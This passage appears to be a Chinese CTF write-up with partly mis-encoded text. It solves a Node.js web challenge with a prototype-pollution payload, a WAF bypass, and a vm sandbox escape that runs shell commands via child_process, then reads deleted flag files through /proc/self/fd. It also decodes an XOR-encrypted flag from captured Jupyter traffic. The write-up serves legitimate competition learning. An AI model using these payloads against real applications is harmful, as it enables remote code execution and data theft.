start.js\"},\"author\":\"You\",\"license\":\"WTFPL\",\"dependencies\":{\"jsonaas-backend\":\"https://geekgame.pku.edu.cn/static/super-secret-jsonaas-backend-1.0.1.tgz\"}} è¯»å…¶ä»–æ–‡ä»¶ä¼šè¯´ Cannot parse file as JSON!ï¼Œæ‰€ä»¥ç›´æ¥ä¸‹è½½ä¸‹æ¥çœ‹æºç å§ã€‚ index.js const express = require('express'); const session = require('express-session'); const helmet = require('helmet'); const fs = require('fs'); const {getflag} = require('./getflag'); const {safe_eval} = require('./safe_eval'); let FLAG0 = getflag('flag0.txt'); let FLAG1 = getflag('flag1.txt'); let FLAG2 = getflag('flag2.txt'); const MAX_LENGTH = 4096; const app = express(); app.use(helmet()); app.use(session({ secret: 'ctl7nk2s170srnivd4r7vj9rh5dv4dgi', resave: false, saveUninitialized: false, })); app.use((req, res, next)=&gt;{ if(req.path.toLowerCase().endsWith('settings')) res.send('this feature is currently under development :('); else next(); }); app.get('/', (req, res)=&gt;{ res.sendFile('readme.html', {root: '.'}); }); function waf(str) { for(let bad_name of Object.getOwnPropertyNames(({}).__proto__)) if(str.indexOf(bad_name)!==-1) return true; return false; } app.get('/api/:path(*)', (req, res)=&gt;{ let path = 'data/'+req.params.path; let in_path = req.query.in_path||''; let out_path = req.query.out_path||''; let prefix = req.session.prefix ? (req.session.prefix+'/') : ''; let eval_mode = req.session.eval_enabled===1; if(waf(in_path) || waf(out_path) || waf(prefix)) { res.send('Bad parameter!'); return; } if(!fs.existsSync(path)) { res.send('File does not exists!'); return; } let data = fs.readFileSync(path); if(data.length&gt;MAX_LENGTH) { res.send('File too big!'); return; } try { data = JSON.parse(data); } catch(_) { res.send('Cannot parse file as JSON!'); return; } in_path = prefix + in_path; in_path = in_path.split('/').filter(x=&gt;x!==''); for(let term of in_path) { if(term.indexOf('_')!==-1) { res.send('Bad parameter!'); return; } if(eval_mode &amp;&amp; /^\\([^a-zA-Z\"',;]+\\)$/.test(term)) term = safe_eval(term); if(data[term]===undefined) data[term] = {}; data = data[term]; } if(!JSON.stringify(data)) { res.send('Bad data!'); return; } let output = {}; out_path = prefix + out_path; out_path = out_path.split('/').filter(x=&gt;x!==''); if(out_path.length===0) output = data; else { let cur = output; for(let term of out_path.slice(0, out_path.length-1)) { if(term.indexOf('_')!==-1) { res.send('Bad parameter!'); return; } // no eval for out_path :) /* if(eval_mode &amp;&amp; /^\\([^a-zA-Z\"',;]+\\)$/.test(term)) term = safe_eval(term); */ if(cur[term]===undefined) cur[term] = {}; cur = cur[term]; } cur[out_path[out_path.length-1]] = data; } res.json(output); }); app.get('/activate', (req, res)=&gt;{ if(req.query.code===FLAG1) req.session.activated = 1; if(req.session.activated) res.send(`You have been activated. Activation code: ${FLAG1}`); else res.send('Wrong activation code :('); }); app.get('/eval_settings', (req, res)=&gt;{ if(req.session.activated!==1) { res.send('Eval feature requires activation :('); return; } req.session.eval_enabled = req.query.eval==='on' ? 1 : 0; res.send(`Eval set to ${req.session.eval_enabled}`); }); app.get('/prefix_settings', (req, res)=&gt;{ if(req.session.activated!==1) { res.send('Prefix feature requires activation :('); return; } if(waf(req.query.prefix)) { res.send('Bad prefix!'); return; } req.session.prefix = req.query.prefix; res.send(`Prefix set to \"${req.session.prefix}\"`); }); module.exports = function start_server(port) { if(FLAG0!==`flag{${0.1+0.2}}`) return; FLAG2 = null; app.listen(port, ()=&gt;{ console.log(`server started on :${port}`); }); } flag0 flag{0.30000000000000004} å£¹Â·å¼€é€šä¼šå‘˜å†çœ‹ flag1 ç›¸å…³çš„æºç ã€‚ app.get('/activate', (req, res)=&gt;{ if(req.query.code===FLAG1) req.session.activated = 1; if(req.session.activated) res.send(`You have been activated. Activation code: ${FLAG1}`); else res.send('Wrong activation code :('); }); å¾ˆæ˜æ˜¾æ˜¯è¦ åŸå‹é“¾æ±¡æŸ“ äº†ã€‚ è¿™é‡Œéœ€è¦ req.session.activated ä¸ä¸ºå‡å°±è¡Œï¼Œè€Œè¿™ä¸ªå‚æ•°æœ¬èº«æ˜¯æ²¡å®šä¹‰è¿‡çš„ï¼Œäºæ˜¯å°±ä¼šå¾€ä¸Šä¸€å±‚å»æ‰¾ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ±¡æŸ“ Objectï¼Œè®© Object.activated æœ‰å€¼å°±è¡Œã€‚ å†çœ‹æºç ã€‚ in_path = prefix + in_path; in_path = in_path.split('/').filter(x=&gt;x!==''); for(let term of in_path) { if(term.indexOf('_')!==-1) { res.send('Bad parameter!'); return; } if(eval_mode &amp;&amp; /^\\([^a-zA-Z\"',;]+\\)$/.test(term)) term = safe_eval(term); if(data[term]===undefined) data[term] = {}; data = data[term]; } if(!JSON.stringify(data)) { res.send('Bad data!'); return; } let output = {}; out_path = prefix + out_path; out_path = out_path.split('/').filter(x=&gt;x!==''); if(out_path.length===0) output = data; else { let cur = output; for(let term of out_path.slice(0, out_path.length-1)) { if(term.indexOf('_')!==-1) { res.send('Bad parameter!'); return; } // no eval for out_path :) /* if(eval_mode &amp;&amp; /^\\([^a-zA-Z\"',;]+\\)$/.test(term)) term = safe_eval(term); */ if(cur[term]===undefined) cur[term] = {}; cur = cur[term]; } cur[out_path[out_path.length-1]] = data; } res.json(output); è¿™é‡Œè¿‡æ»¤äº†ä¸èƒ½æœ‰ _ï¼Œä¸”åœ¨ waf é‡Œä¹Ÿéå†äº†è¾“å…¥çš„ str.indexOf æ˜¯å¦å­˜åœ¨å’Œ ({}).__proto__ æ‰€åŒ…å«çš„å±æ€§ã€‚çœ‹èµ·æ¥å¾ˆå¥½åœ°è¿‡æ»¤äº†åŸå‹é“¾ï¼Œå®é™…ä¸Šå¹¶ä¸æ˜¯ã€‚ ï¼ˆç„¶è€Œå–µå–µå´è°ƒäº†è€åŠå¤©â€¦â€¦ è¿™ä¸ª indexOfï¼Œå…¶å®ä¸ä»…ä»… Sting æœ‰ï¼ŒArray ä¹Ÿæœ‰ï¼Œåªè¦å’±ä¼ ä¸ªæ•°ç»„è¿›å»ï¼Œå°±åŒ¹é…ä¸åˆ°è¿™äº›å±æ€§åç§°äº†ã€‚ è¿™ä¸ª trick è¿˜æ˜¯ä»Šå¹´ä¸œåæ¯çš„ä¸€é“ web ä¸­çš„è§åˆ°çš„ï¼Œèµ›åçœ‹å…¶ä»–å¸ˆå‚… wp å­¦åˆ°çš„ï¼ˆ ç„¶è€Œï¼Œè¿˜ä¸èƒ½ç”¨ __proto__ï¼Œä½†å…¶å®èƒ½ç”¨ constructor.prototype. å†å›åˆ°æºç ï¼Œä¸ºäº†å®Œæˆè¿™ä¸ªèµ‹å€¼ï¼Œout_path é€šè¿‡ cur = cur[term]; ä¾æ¬¡å¾€ {} å†…å±‚åµŒå¥—èµ‹å€¼ï¼Œå†æŠŠæœ€åçš„ç»“æœä»è¯»å–åˆ°çš„ JSON æ–‡ä»¶é‡Œå– in_path ç›¸åº”çš„å€¼ã€‚äºæ˜¯å°±å¯ä»¥é€šè¿‡ / æ¥åˆ†å‰²æ¯ä¸€ä¸ª .ï¼Œä¹Ÿå°±æ˜¯æ„é€  constructor/prototype/xxx è¿™æ ·å°±è¡Œäº†ã€‚ è¿™é‡Œåªéœ€è¦ activated ä¸ä¸ºå‡ï¼Œé‚£éšä¾¿æ•´ä¸ª demo.js é‡Œçš„ä¸œè¥¿èµ‹å€¼è¿‡å»å°±å®Œäº‹äº†ã€‚ å”‰ï¼Œæœ¬åœ°è°ƒäº†è€åŠå¤©â€¦â€¦å¯ä»¥çœ‹åˆ°è¿™ä¸ª req.session.activated å°±è¢«è®¾ç½®äº†ã€‚è¿˜æ˜¯å¤ªèœäº†ã€‚ ç„¶åæ‰“è¿œç¨‹ã€‚ payload: GET /api/demo.json?in_path=1&amp;out_path[]=constructor/prototype/activated å†è®¿é—® /activate flag{I-Can-activate-FRom-Prototype} æŠ¢äº†ä¸ªäºŒè¡€ï¼ˆå¯æ¶ï¼Œä¸€è¡€æ²¡äº†ï¼Œå‘œå‘œ è´°Â·ä¸ºæ‰€æ¬²ä¸ºé‚£æ¥ä¸‹æ¥å°±æ˜¯è¦è®© req.session.eval_enabled===1ã€‚ åœ¨æƒ³å»å“ªæ‰¾ä¸ª1å‘¢ï¼Ÿå‰é¢é‚£ä¸ª package.json é‡Œæ­£å¥½æœ‰ï¼Œæ¥è¯•è¯•è¡Œä¸è¡Œã€‚ å°è¯•æ„é€  payload: GET /api/../package.json?in_path=version/0&amp;out_path[]=constructor/prototype/eval_enabled ç„¶è€Œå‘ç°ä¸å¤§è¡Œï¼Œä»–æ˜¯ ===ï¼Œè¿™ä¸ª string ç»•ä¸è¿‡â€¦â€¦å¾—æ‰¾ä¸ª int çš„ 1. è¯•äº†è¯•ï¼Œå‘ç° Object.length === 1. äºæ˜¯å¯ä»¥ç”¨ {}[\"constructor\"][\"length\"] æ¥å¾—åˆ°1. GET /api/demo.json?in_path[]=0/constructor/length ç„¶åæ”¹æ”¹ä¸Šé¢çš„ payload GET /api/demo.json?in_path[]=0/constructor/length&amp;out_path[]=constructor/prototype/eval_enabled å†çœ‹å‚æ•°ï¼Œç°åœ¨ eval_enabled å°±å˜ä¸ºæ•°å­—çš„ 1 äº†ã€‚ è¿™é‡Œå‘ç°æœ‰ç‚¹é”…ï¼Œå¾—é‡å¯ä¸€ä¸‹ã€‚ å…³äº Web é¢˜ç›®ç¯å¢ƒ ä¸ºäº†é¿å…é€‰æ‰‹ä¹‹é—´äº’ç›¸å¹²æ‰°ï¼ŒWeb é¢˜ç›®ä¸ºæ¯ä¸ªé€‰æ‰‹åˆ†é…ä¸€ä¸ªç‹¬ç«‹çš„åç«¯ç¯å¢ƒã€‚ ç‚¹å‡» â€œæ‰“å¼€/ä¸‹è½½é¢˜ç›®â€ æ—¶ï¼Œå°†ä¼šè®¿é—®å¯åŠ¨å™¨ï¼ˆç½‘å€å½¢å¦‚ prob**-manager.geekgame.pku.edu.cn/docker-manager/start?...ï¼‰ï¼Œè¿™ä¸ªç³»ç»Ÿå°†å¯åŠ¨ä¸€ä¸ªè¯¥é¢˜çš„åç«¯ç¯å¢ƒï¼ˆåŸŸåå½¢å¦‚ prob**-xxxxxxxx.geekgame.pku.edu.cnï¼‰ï¼Œå¹¶å°†é€‰æ‰‹é‡å®šå‘è¿‡å»ã€‚ æŒç»­ 15 åˆ†é’Ÿæ²¡æœ‰äººè®¿é—®æ—¶ï¼Œåç«¯ç¯å¢ƒå°†è‡ªåŠ¨å…³é—­ã€‚ä¸‹æ¬¡ç‚¹å‡» â€œæ‰“å¼€/ä¸‹è½½é¢˜ç›®â€ æ—¶ä¼šé‡æ–°å¯åŠ¨ä¸€ä¸ªæ–°çš„ç¯å¢ƒã€‚ å¦‚æœç¯å¢ƒå‡ºç°é—®é¢˜ï¼Œé€‰æ‰‹å¯ä»¥å°†å¯åŠ¨å™¨ç½‘å€çš„ /start æ”¹æˆ /stop æ¥æ‰‹åŠ¨å…³é—­é¢˜ç›®ã€‚ æ‰‹åŠ¨å…³é—­åéœ€è¦ç­‰å¾…ä¸€åˆ†é’Ÿæ–¹å¯é‡æ–°å¯åŠ¨ã€‚ æ‰€æœ‰ Web é¢˜ç›®ç¯å¢ƒå‡æ²¡æœ‰å¤–ç½‘ï¼Œå› æ­¤æ— æ³•åå¼¹ Shellã€‚ via https://geekgame.pku.edu.cn/faq/ https://prob11-manager.geekgame.pku.edu.cn/docker-manager/stop?&lt;your_token&gt; https://prob11-manager.geekgame.pku.edu.cn/docker-manager/start?&lt;your_token&gt; ç„¶åä¼šåˆ†é…ä¸€ä¸ªæ–°çš„ docker ç¯å¢ƒã€‚ã€‚ ç°åœ¨å°±èƒ½æ‰§è¡Œä»£ç äº†ã€‚ èµ›åçœ‹å…¶ä»–å¸ˆå‚…çš„ wpï¼Œå‘ç°å…¶å®é‚£ä¸ª url é‡Œçš„ settings è¿‡æ»¤ï¼Œç›´æ¥åŠ ä¸ª / å°±èƒ½ç»•è¿‡äº†ï¼Œä¹Ÿå°±æ˜¯ GET /eval_settings/?on=1 è®°å¾—å…ˆè®¿é—®ä¸€ä¸‹è¿™ä¸ªè®© req.session.activated = 1ã€‚ /activate?code=flag{I-Can-activate-FRom-Prototype} ç„¶åå°±èƒ½ eval äº†ã€‚ å†çœ‹å’‹ RCE å‘¢ã€‚ if(eval_mode &amp;&amp; /^\\([^a-zA-Z\"',;]+\\)$/.test(term)) term = safe_eval(term); safe_eval.js const child_process = require('child_process'); const CLIENT_CODE = ` const vm = require(\"vm\"); const code = __USERCODE__; console.log(vm.runInNewContext(code, {})); `; const TIMEOUT_MS = 1000; function safe_eval(s) { let code = CLIENT_CODE.replace('__USERCODE__', JSON.stringify(s)); try { let stdout = child_process.execFileSync('/usr/local/bin/node', ['-'], { input: code, env: {}, timeout: TIMEOUT_MS, encoding: 'utf-8', killSignal: 'SIGTERM', }); return stdout.trim(); } catch(_) { return s; } } module.exports = { safe_eval: safe_eval, }; æƒ³åˆ°å¯ä»¥ ç”¨ JSFuck æ¥ç»•è¿‡è¿™ä¸ª regexã€‚ ä½†æ˜¯ï¼Œå‘ç°ç”±äºæ˜¯åœ¨ header é‡Œä¼ çš„ï¼Œå¤ªé•¿äº†å°±ä¸è¡Œäº†ç›´æ¥ 431 äº†ã€‚ å…ˆä¸ç®¡è¿™ä¸ªï¼Œæ¥ä¸‹æ¥å°±æ˜¯ vm é€ƒé€¸ï¼Œè¿™ä¸ªå…¶å®ç›¸å¯¹ vm2 è€Œè¨€è¿˜æŒºç®€å•ï¼Œç›´æ¥è¿è¡Œ this.constructor.constructor('return this.process.env')() å°±èƒ½æ‹¿åˆ°ä¸»å‡½æ•°çš„ä¸Šä¸‹æ–‡ç¯å¢ƒã€‚ æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å°±å¯ä»¥ç”¨ this.constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami').toString() è¿™é‡Œè¯»æ–‡ä»¶çš„è¯å°±å¯ä»¥ç›´æ¥ç”¨ fsï¼Œthis.constructor.constructor(\"require('fs').readFileSync('/proc/xxxx/fd/xx')\") å¤§æ¦‚è¿™æ ·ã€‚ ç„¶è€Œï¼Œå…¶å®è¿˜æœ‰ä¸ªé—®é¢˜ï¼Œ**FLAG2 å·²ç»è¢«è®¾ä¸º null äº†ï¼Œè€Œä¸”æ–‡ä»¶å·²ç»è¢« unlink åˆ äº†**ã€‚ getflag.js const fs = require('fs'); const crypto = require('crypto'); function getflag(path) { let f; try { f = fs.openSync(path); } catch(e) { //return 'failed'; throw e; } let content = fs.readFileSync(f, {encoding: 'utf-8'}).trim(); fs.unlinkSync(path); return content; } module.exports = { getflag: getflag, }; ä½†æ˜¯ï¼Œä»– fs æ²¡ close å•Šï¼ï¼ï¼ï¼ æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥ä»ä¸»ç¨‹åºçš„ fdï¼ˆfile descriptorï¼‰é‡Œæ‹¿åˆ°çš„ï¼ ä¹Ÿå°±æ˜¯ /proc/self/fd/xxï¼Œå¯èƒ½è¦çˆ†ç ´ä¸€ä¸‹ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æœ¬åœ°è·‘èµ·æ¥çœ‹çœ‹ã€‚ è¿™æ—¶åˆæƒ³äº†æƒ³æ˜¯ä¸æ˜¯ä» env å»æ‰“ï¼Œä¹Ÿå°±æ˜¯ fork æ–°è¿›ç¨‹çš„æ—¶å€™é€šè¿‡ç¯å¢ƒå˜é‡æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå‚è€ƒ NCTF 2020 çš„ PackageManager_v1.0 ä¸€é¢˜ã€‚ ä½†å‘ç°è¿™é¢˜é‡Œ env: {} å·²ç»èµ‹å€¼ä¸ºç©ºäº†ï¼Œä¸èƒ½é€šè¿‡æ±¡æŸ“åŸå‹é“¾æ¥èµ‹å€¼äº†â€¦â€¦ å‘œå‘œå‘œã€‚ äºæ˜¯åˆå›æ¥è€ƒè™‘ jsfuck çš„é—®é¢˜ï¼Œè¿™é¢˜è¿™ä¸€é—®æœ¬æ¥è¿˜æƒ³æŠ¢ä¸€è¡€çš„ï¼Œç»“æœä»ç¬¬ä¸€å¤©åšåˆ°äº†æœ€åä¸€å¤©ä¹Ÿæ²¡è§£å‡ºæ¥ï¼Œæœ€åå‘ç°æœç„¶è¦ä¼˜åŒ– jsfuck å•Šï¼Œå¥½æ°”å•Šï¼ TODO Extensive Reading: Harekaze 2019 â€œ[a-z().]â€ (200) ç¿»è½¦çš„è°œè¯­äºº ä½œä¸ºæ›¾æ‹…ä»»ä¸Šå±Šæ¯”èµ›å‘½é¢˜å·¥ä½œçš„èµ„æ·±è°œè¯­äººï¼ŒYou é…±è¿™æ¬¡ä¹Ÿè¢«é‚€è¯·æ¥å‡ºä¸€é“è€ƒå¯Ÿä¿¡æ¯éšå†™çš„ Misc é¢˜ç›®ã€‚You é…±æ‰¾ç»„å§”ä¼šç¡®è®¤äº†æœ¬å±ŠåŠ³åŠ¡è´¹èƒ½å¦å‡†æ—¶å‘æ”¾åå°±è¿…é€Ÿå¼€å·¥äº†ï¼Œä½†å¥¹ä¸çŸ¥é“ï¼Œè¿™å…¶å®æ˜¯ä¸€ä¸ªå½»å½»åº•åº•çš„é™·é˜±ã€‚ äº‹å®ä¸Šï¼Œç»„å§”ä¼šæ›¾åœ¨å‡ ä¸ªæœˆå‰æ”¶åˆ°äº†æŠ¥å‘Šï¼Œç§° You é…±æˆ–è¿åè§„å®šåœ¨é¢˜ç›®é‡Œç§è‡ªæºæ‚å¤§é‡ç§è´§ï¼Œä½†è¿™åªæ˜¯ä¸ªçŒœæƒ³ï¼Œä¸ä¸€å®šå¯¹ã€‚äºæ˜¯ï¼Œç»„å§”ä¼šåœ¨é‚€è¯· You é…±å‘½é¢˜çš„åŒæ—¶ï¼Œæ´¾å‡ºé—´è°éº»é‡Œå¥ˆå°å§æŒç»­å…³æ³¨ You é…±çš„ä¸€ä¸¾ä¸€åŠ¨ï¼Œå¸Œæœ›èƒ½å¤Ÿå‘ç°å†³å®šæ€§çš„è¯æ®ã€‚ éº»é‡Œå¥ˆå°å§ä¸è´Ÿä¼—æœ›ï¼Œé€šè¿‡é‡å­æ³¢åŠ¨ç®—æ³•æˆªè·äº†ä¸€æ®µ You é…±è®¿é—®å¢ƒå¤–æœåŠ¡å™¨çš„æµé‡è®°å½•ã€‚ç°åœ¨å¥¹æƒ³è®©ä½ æ¥å¸®å¿™åˆ†æå…¶ä¸­çš„ç«¯å€ªã€‚ flag1æ˜¯ä¸ªæµé‡åŒ…ï¼Œæ‰“å¼€ä¸€çœ‹ã€‚ è¿™ä¸€çœ‹å°±æ˜¯ jupyter notebook å§ï¼ˆ åˆ†åˆ«å¾—åˆ° {\"type\":\"notebook\",\"content\":{\"cells\":[{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"import zwsp_steg\\nfrom Crypto.Random import get_random_bytes\",\"execution_count\":26,\"outputs\":[]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"import binascii\",\"execution_count\":27,\"outputs\":[]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"def genflag():\\n return 'flag{%s}'%binascii.hexlify(get_random_bytes(16)).decode()\",\"execution_count\":28,\"outputs\":[]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"flag1 = genflag()\\nflag2 = genflag()\",\"execution_count\":29,\"outputs\":[]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"key = get_random_bytes(len(flag1))\",\"execution_count\":30,\"outputs\":[]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"key\",\"execution_count\":31,\"outputs\":[{\"output_type\":\"execute_result\",\"execution_count\":31,\"data\":{\"text/plain\":\"b'\\\\x1e\\\\xe0[u\\\\xf2\\\\xf2\\\\x81\\\\x01U_\\\\x9d!yc\\\\x8e\\\\xce[X\\\\r\\\\x04\\\\x94\\\\xbc9\\\\x1d\\\\xd7\\\\xf8\\\\xde\\\\xdcd\\\\xb2Q\\\\xa3\\\\x8a?\\\\x16\\\\xe5\\\\x8a9'\"},\"metadata\":{}}]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"def xor_each(k, b):\\n assert len(k)==len(b)\\n out = []\\n for i in range(len(b)):\\n out.append(b[i]^k[i])\\n return bytes(out)\",\"execution_count\":32,\"outputs\":[]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"encoded_flag1 = xor_each(key, flag1.encode())\\nencoded_flag2 = xor_each(key, flag2.encode())\",\"execution_count\":33,\"outputs\":[]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"with open('flag1.txt', 'wb') as f:\\n f.write(binascii.hexlify(encoded_flag1))\",\"execution_count\":35,\"outputs\":[]},{\"metadata\":{\"trusted\":true},\"cell_type\":\"code\",\"source\":\"\",\"execution_count\":null,\"outputs\":[]}],\"metadata\":{\"kernelspec\":{\"name\":\"python3\",\"display_name\":\"Python 3 (ipykernel)\",\"language\":\"python\"},\"language_info\":{\"name\":\"python\",\"version\":\"3.8.3rc1\",\"mimetype\":\"text/x-python\",\"codemirror_mode\":{\"name\":\"ipython\",\"version\":3},\"pygments_lexer\":\"ipython3\",\"nbconvert_exporter\":\"python\",\"file_extension\":\".py\"}},\"nbformat\":4,\"nbformat_minor\":4}} {\"name\": \"flag1.txt\", \"path\": \"flag1.txt\", \"last_modified\": \"2021-11-06T07:43:20.952991Z\", \"created\": \"2021-11-06T07:43:20.952991Z\", \"content\": \"788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44\", \"format\": \"text\", \"mimetype\": \"text/plain\", \"size\": 76, \"writable\": true, \"type\": \"file\"} æ˜¯ç®€å•çš„ xorï¼Œç„¶åæŒ‰ç…§åŸæ¥çš„ä»£ç ç®€å•è¿˜åŸä¸€ä¸‹å°±è¡Œã€‚ from os import fspath # import zwsp_steg from Crypto.Random import get_random_bytes import binascii def genflag(): return 'flag{%s}' % binascii.hexlify(get_random_bytes(16)).decode() flag1 = genflag() flag2 = genflag() key = get_random_bytes(len(flag1)) key # b'\\x1e\\xe0[u\\xf2\\xf2\\x81\\x01U_\\x9d!yc\\x8e\\xce[X\\r\\x04\\x94\\xbc9\\x1d\\xd7\\xf8\\xde\\xdcd\\xb2Q\\xa3\\x8a?\\x16\\xe5\\x8a9' key1 = b'\\x1e\\xe0[u\\xf2\\xf2\\x81\\x01U_\\x9d!yc\\x8e\\xce[X\\r\\x04\\x94\\xbc9\\x1d\\xd7\\xf8\\xde\\xdcd\\xb2Q\\xa3\\x8a?\\x16\\xe5\\x8a9' def xor_each(k, b): assert len(k) == len(b) out = [] for i in range(len(b)): out.append(b[i] ^ k[i]) return bytes(out) encoded_flag1 = xor_each(key, flag1.encode()) encoded_flag2 = xor_each(key, flag2.encode()) with open('flag1.txt', 'wb') as f: f.write(binascii.hexlify(encoded_flag1)) # flag1.txt # 788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44 flag1_en = binascii.unhexlify(\"788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44\") flag1_de = xor_each(flag1_en, key1) print(flag1_de) # b'flag{9d9a9d92dcb1363c26a0c29fda2edfb6}' flag2 save ä¸€ä¸‹ï¼Œå‘ç°è¿™ä¸ª 7z é‡Œé¢è¿˜å¾—è¦å¯†ç ã€‚ strings çœ‹ä¸€çœ¼ï¼Œå‘ç°äº†å‹ç¼©çš„è¿‡ç¨‹ï¼Œå¾ˆæ˜æ˜¾è¿™ä¸ªåº”è¯¥æ˜¯åœ¨ terminal é‡Œè¿›è¡Œçš„ï¼Œæ˜¯é€šè¿‡ websocket è¿›è¡Œäº¤äº’ã€‚ å…ˆè¿‡æ»¤ websocketï¼Œç„¶å tcp.stream eq 11 [\"setup\", {}].`[\"stdout\", \"\\u001b[01;32mroot@you-kali-vm\\u001b[00m:\\u001b[01;34m~/course/geekgame\\u001b[00m# \"].j[\"stdout\", \"\\r\\u001b[K\\u001b[01;32mroot@you-kali-vm\\u001b[00m:\\u001b[01;34m~/course/geekgame\\u001b[00m# \"]..[\"stdout\", \"p\"]..[\"stdout\", \"i\"]..[\"stdout\", \"p\"]..[\"stdout\", \"3\"]..[\"stdout\", \" \"]..[\"stdout\", \"i\"]..[\"stdout\", \"n\"]..[\"stdout\", \"s\"]..[\"stdout\", \"t\"]..[\"stdout\", \"a\"]..[\"stdout\", \"l\"]..[\"stdout\", \"l\"]..[\"stdout\", \" \"]..[\"stdout\", \"s\"]..[\"stdout\", \"t\"]..[\"stdout\", \"e\"]..[\"stdout\", \"g\"]..[\"stdout\", \"o\"]..[\"stdout\", \"-\"]..[\"stdout\", \"l\"]..[\"stdout\", \"s\"]..[\"stdout\", \"b\"]..[\"stdout\", \"\\r\\n\"].N[\"stdout\", \"Looking in indexes: https://pypi.tuna.tsinghua.edu.cn/simple\\r\\n\"].&amp;[\"stdout\", \"Collecting stego-lsb\\r\\n\"].~..[\"stdout\", \" Downloading https://pypi.tuna.tsinghua.edu.cn/packages/8a/2b/5be4be36ccb3788f1443805583f9ab8182f88f15143778a72dc259b54557/stego_lsb-1.3.1.tar.gz (10 kB)\\r\\n\"].&gt;[\"stdout\", \" Preparing metadata (setup.py) ... \\u001b[?25l-\"]..[\"stdout\", \"\\b \\bdone\\r\\n\"].~..[\"stdout\", \"\\u001b[?25hRequirement already satisfied: Click&gt;=7.0 in /usr/local/lib/python3.8/dist-packages (from stego-lsb) (8.0.1)\\r\\n\"].y[\"stdout\", \"Requirement already satisfied: Pillow&gt;=5.3.0 in /usr/lib/python3/dist-packages (from stego-lsb) (6.2.1)\\r\\n\"].z[\"stdout\", \"Requirement already satisfied: numpy&gt;=1.15.4 in /usr/lib/python3/dist-packages (from stego-lsb) (1.17.4)\\r\\n\"].C[\"stdout\", \"Building wheels for collected packages: stego-lsb\\r\\n\"].H[\"stdout\", \" Building wheel for stego-lsb (setup.py) ... \\u001b[?25l-\"]..[\"stdout\", \"\\b \\bdone\\r\\n\"].~.*[\"stdout\", \"\\u001b[?25h Created wheel for stego-lsb: filename=stego_lsb-1.3.1-py2.py3-none-any.whl size=12135 sha256=20d5395e597058e6e37da40acc32a1c876fc7f334c671591c422b048e38cb5f2\\r\\n Stored in directory: /root/.cache/pip/wheels/ee/b5/10/f779bd3e1c420586ef8cc2cb8768073362f51e3024e7116cc3\\r\\n\"]..[\"stdout\", \"Successfully built stego-lsb\\r\\n\"].:[\"stdout\", \"Installing collected packages: stego-lsb\\r\\n\"].~.,[\"stdout\", \"Successfully installed stego-lsb-1.3.1\\r\\n\\u001b[33mWARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv\\u001b[0m\\r\\n\"].`[\"stdout\", \"\\u001b[01;32mroot@you-kali-vm\\u001b[00m:\\u001b[01;34m~/course/geekgame\\u001b[00m# \"]..[\"stdout\", \"s\"]..[\"stdout\", \"t\"]..[\"stdout\", \"e\"]..[\"stdout\", \"g\"]..[\"stdout\", \"o\"]..[\"stdout\", \"-\"]..[\"stdout\", \"l\"]..[\"stdout\", \"\\u0007\"]..[\"stdout\", \"s\"]..[\"stdout\", \"b\"]..[\"stdout\", \" \"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"l\"]..[\"stdout\", \"s\"]..[\"stdout\", \"b\"]..[\"stdout\", \" \"]..[\"stdout\", \"w\"]..[\"stdout\", \"a\"]..[\"stdout\", \"v\"]..[\"stdout\", \"s\"]..[\"stdout\", \"t\"]..[\"stdout\", \"e\"]..[\"stdout\", \"g\"]..[\"stdout\", \" \"]..[\"stdout\", \"-\"]..[\"stdout\", \"h\"]..[\"stdout\", \" \"]..[\"stdout\", \"-\"]..[\"stdout\", \"i\"]..[\"stdout\", \" \"]..[\"stdout\", \"k\"]..[\"stdout\", \"i\"]..[\"stdout\", \"-\"]..[\"stdout\", \"ringtrain.wav \"]..[\"stdout\", \"-\"]..[\"stdout\", \"s\"]..[\"stdout\", \" \"]..[\"stdout\", \"f\"]..[\"stdout\", \"l\"]..[\"stdout\", \"a\"]..[\"stdout\", \"g\"]..[\"stdout\", \"2\"]..[\"stdout\", \".\"]..[\"stdout\", \"t\"]..[\"stdout\", \"xt \"]..[\"stdout\", \"-\"]..[\"stdout\", \"o\"]..[\"stdout\", \" \"]..[\"stdout\", \"f\"]..[\"stdout\", \"l\"]..[\"stdout\", \"\\u0007ag\"]..[\"stdout\", \"2\"]..[\"stdout\", \".\"]..[\"stdout\", \"txt \"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"\\b\\u001b[K\"]..[\"stdout\", \"w\"]..[\"stdout\", \"a\"]..[\"stdout\", \"v\"]..[\"stdout\", \" \"]..[\"stdout\", \"-\"]..[\"stdout\", \"n\"]..[\"stdout\", \" \"]..[\"stdout\", \"1\"]..[\"stdout\", \"\\r\\n\"].8[\"stdout\", \"Using 1 LSBs, we can hide 297712 bytes\\r\\n\"].9[\"stdout\", \"Files read in 0.00s\\r\\n\"].9[\"stdout\", \"76 bytes hidden in 0.01s\\r\\n\"].9[\"stdout\", \"Output wav written in 0.00s\\r\\n\"].`[\"stdout\", 